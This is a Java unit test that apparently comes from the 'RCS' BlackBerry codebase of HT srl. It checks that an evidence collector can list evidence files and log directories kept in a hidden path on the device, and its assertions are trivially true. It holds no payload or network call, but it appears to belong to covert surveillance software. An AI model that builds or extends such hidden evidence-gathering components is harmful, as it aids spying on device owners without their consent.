//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_LogCollector.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;
import java.util.Vector;

import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import blackberry.evidence.EvidenceCollector;
import blackberry.fs.Path;

//#ifdef DEBUG
//#endif
/**
 * The Class UT_LogCollector.
 */
public final class UT_LogCollector extends TestUnit {

    EvidenceCollector logCollector = EvidenceCollector.getInstance();

    /**
     * Instantiates a new u t_ log collector.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_LogCollector(final String name, final Tests tests) {
        super(name, tests);
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {
        scanTests();
        return true;
    }

    /**
     * Scan tests.
     * 
     * @throws AssertException
     *             the assert exception
     */
    public void scanTests() throws AssertException {
        Vector vector;

        vector = logCollector.scanForEvidences(Path.hidden(), "1_0");
        AssertThat(vector.size() >= 0, "Wrong file number");

        vector = logCollector.scanForDirLogs(Path.hidden());
        AssertThat(vector.size() >= 0, "Wrong dir number");

    }
}
